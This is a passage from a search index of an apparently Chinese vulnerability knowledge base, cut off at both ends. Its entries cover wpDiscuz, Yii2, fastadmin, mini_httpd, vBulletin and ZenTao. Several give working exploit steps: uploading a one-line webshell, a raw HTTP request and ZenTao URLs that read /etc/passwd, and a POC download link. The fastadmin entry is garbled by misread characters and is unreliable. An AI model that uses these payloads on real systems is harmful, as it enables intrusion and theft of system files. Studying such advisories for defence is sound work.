\u7ba1\u7406\u5458\u767b\u5f55\uff0c\u5728\u63d2\u4ef6\u6a21\u5757\u5b89\u88c5wpdiscuz\u63d2\u4ef6\uff0c\u5373\u53ef\u770b\u5230\u8bc4\u8bba\u754c\u9762\u53d8\u6210\u8fd9\u4e2a\u6837\u5b50\uff0c\u70b9\u51fb\u56fe\u7247\u7684\u5c0f\u6807\u53ef\u4e0a\u4f20\u56fe\u7247\u3002 \u6f0f\u6d1epoc poc (2) \u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u4fee\u6539\u4e3aGTF\u5934 \u8681\u5251\u8fde\u63a5\u6210\u529f","title":"WordPress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u7b80\u4ecb \u00b6 \u5982\u679c\u5728\u4f7f\u7528yii\u6846\u67b6\uff0c\u5e76\u4e14\u5728\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u8f93\u5165\u5904\u8c03\u7528\u4e86unserialize()\u5e76\u5141\u8bb8\u7279\u6b8a\u5b57\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u53d7\u5230\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u3002 \u8be5\u6f0f\u6d1e\u53ea\u662fphp \u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u94fe\uff0c\u5fc5\u987b\u8981\u914d\u5408unserialize\u51fd\u6570\u624d\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5371\u5bb3\u3002 \u8be5\u53cd\u5e8f\u5217\u5316\u6267\u884c\u94fe\u5728\u4eca\u5e748\u6708\u521d\u5df2\u7ecf\u516c\u5f00\uff0c\u5efa\u8bae\u4f7f\u7528yii\u6846\u67b6\u7684\u540c\u5b66\u6392\u67e5 \u5f71\u54cd\u8303\u56f4 \u00b6 Yii2 <2.0.38 \u4fee\u590d\u65b9\u6848 \u00b6 \u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u7981\u6b62BatchQueryResult\u7c7b\u88ab\u53cd\u5e8f\u5217\u5316 exp \u00b6 exp.txt CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316RCE\u5229\u7528\u94fe \u53c2\u8003\u94fe\u63a5 \u00b6 https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99 https://xz.aliyun.com/t/8082#toc-8 https://github.com/AFKL-CUIT/phpggc/","title":"CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"Web%E5%AE%89%E5%85%A8/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","text":"\u5982\u679c\u5728\u4f7f\u7528yii\u6846\u67b6\uff0c\u5e76\u4e14\u5728\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u8f93\u5165\u5904\u8c03\u7528\u4e86unserialize()\u5e76\u5141\u8bb8\u7279\u6b8a\u5b57\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u53d7\u5230\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u3002 \u8be5\u6f0f\u6d1e\u53ea\u662fphp \u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u94fe\uff0c\u5fc5\u987b\u8981\u914d\u5408unserialize\u51fd\u6570\u624d\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5371\u5bb3\u3002 \u8be5\u53cd\u5e8f\u5217\u5316\u6267\u884c\u94fe\u5728\u4eca\u5e748\u6708\u521d\u5df2\u7ecf\u516c\u5f00\uff0c\u5efa\u8bae\u4f7f\u7528yii\u6846\u67b6\u7684\u540c\u5b66\u6392\u67e5","title":"\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","text":"Yii2 <2.0.38","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","text":"\u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u7981\u6b62BatchQueryResult\u7c7b\u88ab\u53cd\u5e8f\u5217\u5316","title":"\u4fee\u590d\u65b9\u6848"},{"location":"Web%E5%AE%89%E5%85%A8/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#exp","text":"exp.txt CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316RCE\u5229\u7528\u94fe","title":"exp"},{"location":"Web%E5%AE%89%E5%85%A8/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","text":"https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99 https://xz.aliyun.com/t/8082#toc-8 https://github.com/AFKL-CUIT/phpggc/","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"Web%E5%AE%89%E5%85%A8/fastadmin/fastadmin%E6%9C%80%E6%96%B0%E7%89%88%E5%89%8D%E5%8F%B0getshell/","text":"\u524d\u63d0\uff1a\u5f00\u542f\u2f64\u6237\u6ce8\u518c \u6f0f\u6d1e\u539f\u56e0\uff1a \u76f4\u63a5\u5c06$name\u53c2\u6570\u5e26\u2f0a\u5230fetch\u51fd\u6570,fetch\u51fd\u6570\u662fThinkPHP\u89e3\u6790\u6a21\u7248\u7684\u51fd\u6570\uff0c\u2fa5\u2faf\u2f40\u6301\u539f\u2f63PHP\uff0c\u6240\u4ee5\u9020\u6210 RCE\uff0c\u76f4\u63a5\u4e0a\u4f20\u6210\u529f\u5c31\u53ef\u4ee5\u8c03\u2f64\u8fd9\u4e2a\u70b9\u89e3\u6790\u3002 Php\u4ee3\u739b\u53ef\u4ee5\u548c\u6807\u76ca\u5728\u6a21\u677f\u2f42\u4ef6\u4e2d\u6f0f\u5408\u4f7f\u2f64,\u53ef\u4ee5\u5728\u6a21\u677f\u2f42\u4ef6\u2fa5\u2faf\u5343\u5199\u4efb\u610f\u7684P\u53e5\u4ee3\u7801,\u5305\u62ec\u4e0b\u2faf\u4e24\u79cd\u2f45\u5f0f: \u4f7f\u2f64php\u6807\u7b7e \u4f8b\u5982: \u6211\u4eec\u5efa\u8fd9\u9700\u8981\u4f7f\u2f64PHP\u4ee3\u7684\u65f6\u5019\u5c3d\u91cf\u91c7\u2f64hp\u7b7e,\u56e0\u4e3a\u539f\u2f63\u7684PHP\u6cd5\u53ef\u80fd\u4f1a\u88ab\u914d\u7f6e\u7981\u2f64\u2f7d\u5bfc\u81f4\u89e3\u6790\u9519\u8bef. \u4f7f\u2f64\u539f\u2f63php\u4ee3\u7801 \u6ce8\u610f:php\u6807\u7b7e\u6216\u8005h\u4ee3\u7801\u2fa5\u2faf\u5c31\u4e0d\u80fd\u518d\u4f7f\u2f64\u6807\u7b7e(\u5305\u666e\u901a\u6807\u76d7\u548c\u4e48\u6807)\u4e86,\u56e0\u6b64\u4e0b\u2faf\u7684\u2f0f\u79cd\u2f45\u5f0f\u90fd\u662f\u2f46\u6548\u7684;","title":"fastadmin\u6700\u65b0\u7248\u524d\u53f0getshell"},{"location":"Web%E5%AE%89%E5%85%A8/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/","text":"\u524d\u8a00 \u00b6 Mini_httpd\u662f\u4e00\u4e2a\u5fae\u578b\u7684Http\u670d\u52a1\u5668\uff0c\u5728\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4fdd\u6301\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6027\u80fd\uff08\u7ea6\u4e3aApache\u768490%\uff09\uff0c\u56e0\u6b64\u5e7f\u6cdb\u88ab\u5404\u7c7bIOT\uff08\u8def\u7531\u5668\uff0c\u4ea4\u6362\u5668\uff0c\u6444\u50cf\u5934\u7b49\uff09\u4f5c\u4e3a\u5d4c\u5165\u5f0f\u670d\u52a1\u5668\u3002\u800c\u5305\u62ec\u534e\u4e3a\uff0czyxel\uff0c\u6d77\u5eb7\u5a01\u89c6\uff0c\u6811\u8393\u6d3e\u7b49\u5728\u5185\u7684\u5382\u5546\u7684\u65d7\u4e0b\u8bbe\u5907\u90fd\u66fe\u91c7\u7528Mini_httpd\u7ec4\u4ef6\u3002 \u5f71\u54cd\u7248\u672c \u00b6 ACME mini_httpd before 1.30 \u6f0f\u6d1e\u5206\u6790 \u00b6 \u5728mini_httpd\u5f00\u542f\u865a\u62df\u4e3b\u673a\u6a21\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u8bf7\u6c42http://HOST/FILE\u5c06\u4f1a\u8bbf\u95ee\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\u7684HOST/FILE\u6587\u4ef6\u3002 (void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f ); \u89c1\u4e0a\u8ff0\u4ee3\u7801\uff0c\u5206\u6790\u5982\u4e0b\uff1a \u5f53HOST=example.com\u3001FILE=index.html\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3aexample.com/index.html\uff0c\u6587\u4ef6\u6b63\u5e38\u8bfb\u53d6\u3002 \u5f53HOST\u4e3a\u7a7a\u3001FILE=etc/passwd\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3a/etc/passwd\u3002 \u540e\u8005\u88ab\u4f5c\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u4e8e\u662f\u8bfb\u53d6\u5230\u4e86/etc/passwd\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u3002 \u73af\u5883\u642d\u5efa``` cd vulhub/mini_httpd/CVE-2018-18778 docker-compose up -d \u542f\u52a8mini_httpd 1.29\uff1a \u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Web\u9875\u9762\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u53d1\u9001\u8bf7\u6c42\u662f\u5c06Host\u7f6e\u7a7a\uff0cPATH\u7684\u503c\u662f\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84\uff1a``` GET /etc/passwd HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close","title":"mini_httpd\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2018-18778\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_1","text":"Mini_httpd\u662f\u4e00\u4e2a\u5fae\u578b\u7684Http\u670d\u52a1\u5668\uff0c\u5728\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4fdd\u6301\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6027\u80fd\uff08\u7ea6\u4e3aApache\u768490%\uff09\uff0c\u56e0\u6b64\u5e7f\u6cdb\u88ab\u5404\u7c7bIOT\uff08\u8def\u7531\u5668\uff0c\u4ea4\u6362\u5668\uff0c\u6444\u50cf\u5934\u7b49\uff09\u4f5c\u4e3a\u5d4c\u5165\u5f0f\u670d\u52a1\u5668\u3002\u800c\u5305\u62ec\u534e\u4e3a\uff0czyxel\uff0c\u6d77\u5eb7\u5a01\u89c6\uff0c\u6811\u8393\u6d3e\u7b49\u5728\u5185\u7684\u5382\u5546\u7684\u65d7\u4e0b\u8bbe\u5907\u90fd\u66fe\u91c7\u7528Mini_httpd\u7ec4\u4ef6\u3002","title":"\u524d\u8a00"},{"location":"Web%E5%AE%89%E5%85%A8/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_2","text":"ACME mini_httpd before 1.30","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_3","text":"\u5728mini_httpd\u5f00\u542f\u865a\u62df\u4e3b\u673a\u6a21\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u8bf7\u6c42http://HOST/FILE\u5c06\u4f1a\u8bbf\u95ee\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\u7684HOST/FILE\u6587\u4ef6\u3002 (void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f ); \u89c1\u4e0a\u8ff0\u4ee3\u7801\uff0c\u5206\u6790\u5982\u4e0b\uff1a \u5f53HOST=example.com\u3001FILE=index.html\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3aexample.com/index.html\uff0c\u6587\u4ef6\u6b63\u5e38\u8bfb\u53d6\u3002 \u5f53HOST\u4e3a\u7a7a\u3001FILE=etc/passwd\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3a/etc/passwd\u3002 \u540e\u8005\u88ab\u4f5c\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u4e8e\u662f\u8bfb\u53d6\u5230\u4e86/etc/passwd\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u3002 \u73af\u5883\u642d\u5efa``` cd vulhub/mini_httpd/CVE-2018-18778 docker-compose up -d \u542f\u52a8mini_httpd 1.29\uff1a \u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Web\u9875\u9762\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"Web%E5%AE%89%E5%85%A8/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_4","text":"\u53d1\u9001\u8bf7\u6c42\u662f\u5c06Host\u7f6e\u7a7a\uff0cPATH\u7684\u503c\u662f\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84\uff1a``` GET /etc/passwd HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/","text":"vBulletin 5.x RCE\uff08CVE-2019-16759 \uff09 \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:11:45 POC \u00b6 \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1KRwmpFVvgV875i0eEaypYQ \u63d0\u53d6\u7801\uff1aklwy \u4fee\u590d\u5efa\u8bae\uff1a \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"vBulletin 5.x RCE\uff08CVE-2019-16759 \uff09"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#vbulletin-5x-rcecve-2019-16759","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:11:45","title":"vBulletin 5.x RCE\uff08CVE-2019-16759 \uff09"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#poc","text":"\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1KRwmpFVvgV875i0eEaypYQ \u63d0\u53d6\u7801\uff1aklwy","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#_1","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"\u4fee\u590d\u5efa\u8bae\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"vBulletin5 5.6.1 SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-20 16:06:02 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 5.5.6pl1\u4e4b\u524d\u7684vBulletin\uff0c5.6.0pl1\u4e4b\u524d\u76845.6.0\u548c5.6.1pl1\u4e4b\u524d\u76845.6.1\u5177\u6709\u9519\u8bef\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u5b9e\u9645\u662fnodeId\u672a\u6388\u6743sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4e14\u5371\u5bb3\u8f83\u5927\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 vBulletin 5.5.6pl1\u4e4b\u524d\u7248\u672c vBulletin 5.6.0pl1\u4e4b\u524d\u76845.6.0\u7248\u672c vBulletin 5.6.1pl1\u4e4b\u524d\u76845.6.1\u7248\u672c payload\uff1a \u00b6 \u4fee\u590d\u5efa\u8bae \u00b6 \u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u5b89\u5168\u8865\u4e01\uff0c\u8bf7\u53ca\u65f6\u66f4\u65b0\u8865\u4e01","title":"vBulletin5 5.6.1 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#vbulletin5-561-sql","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-20 16:06:02","title":"vBulletin5 5.6.1 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"5.5.6pl1\u4e4b\u524d\u7684vBulletin\uff0c5.6.0pl1\u4e4b\u524d\u76845.6.0\u548c5.6.1pl1\u4e4b\u524d\u76845.6.1\u5177\u6709\u9519\u8bef\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u5b9e\u9645\u662fnodeId\u672a\u6388\u6743sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4e14\u5371\u5bb3\u8f83\u5927\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"vBulletin 5.5.6pl1\u4e4b\u524d\u7248\u672c vBulletin 5.6.0pl1\u4e4b\u524d\u76845.6.0\u7248\u672c vBulletin 5.6.1pl1\u4e4b\u524d\u76845.6.1\u7248\u672c","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#payload","text":"","title":"payload\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","text":"\u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u5b89\u5168\u8865\u4e01\uff0c\u8bf7\u53ca\u65f6\u66f4\u65b0\u8865\u4e01","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 \u6587\u4ef6\u5199\u5165 \u6f0f\u6d1e\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 \u6587\u4ef6\u5199\u5165 \u6587\u4ef6\u5305\u542b http://127.0.0.1/zentaopms_11.6/www/api-getModel-api-getMethod-filePath=/tmp/123/1","title":"\u7985\u905311.6RCE\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_1","text":"\u7985\u9053 11.6","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#poc","text":"\u6587\u4ef6\u5199\u5165","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_2","text":"\u7985\u9053 11.6","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#poc_1","text":"\u6587\u4ef6\u5199\u5165 \u6587\u4ef6\u5305\u542b http://127.0.0.1/zentaopms_11.6/www/api-getModel-api-getMethod-filePath=/tmp/123/1","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 http://127.0.0.1/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd","title":"\u7985\u905311.6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_1","text":"\u7985\u9053 11.6","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#poc","text":"http://127.0.0.1/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u7985\u9053 11.6 \u6f0f\u6d1ePOC \u00b6 \u9700\u8981\u767b\u5f55\uff0c\u4f4e\u6743\u9650\u5373\u53ef","title":"\u7985\u905311.6\u540e\u53f0SQL\u6ce8\u5165"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#_1","text":"\u7985\u9053 11.6","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#poc","text":"\u9700\u8981\u767b\u5f55\uff0c\u4f4e\u6743\u9650\u5373\u53ef","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u7985\u90538.9-9.2.1 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 \u8bfb\u53d6\u7248\u672c\u53f7\uff1a http://********/index.php?mode=getconfig \u67e5\u770b\u5fd8\u8bb0\u5bc6\u7801\u6587\u672c\u8def\u5f84\uff1a``` http:// * */zentao/user-reset.html exp\u53ca\u4f7f\u7528\u65b9\u6cd5\uff1a \u5728\u94fe\u63a5\u4e2d\u8f93\u5165\u6784\u9020\u597d\u7684\u8bed\u53e5base64\u7f16\u7801\u540e\u5b57\u7b26\u4e32\u5373\u53ef","title":"\u7985\u90538.2-9.2.1\u6ce8\u5165GetShell"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/#_1","text":"\u7985\u90538.9-9.2.1","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/#_2","text":"\u8bfb\u53d6\u7248\u672c\u53f7\uff1a http://********/index.php?mode=getconfig \u67e5\u770b\u5fd8\u8bb0\u5bc6\u7801\u6587\u672c\u8def\u5f84\uff1a``` http:// * */zentao/user-reset.html exp\u53ca\u4f7f\u7528\u65b9\u6cd5\uff1a \u5728\u94fe\u63a5\u4e2d\u8f93\u5165\u6784\u9020\u597d\u7684\u8bed\u53e5base64\u7f16\u7801\u540e\u5b57\u7b26\u4e32\u5373\u53ef","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/","text":"\u5f71\u54cd\u8303\u56f4\uff1a \u00b6 V1.2.8.0#xxx \u5229\u7528POC \u00b6 poc txt\u4e0b\u8f7d","title":" "},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#_1","text":"V1.2.8.0#xxx","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#poc","text":"poc txt\u4e0b\u8f7d","title":"\u5229\u7528POC"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 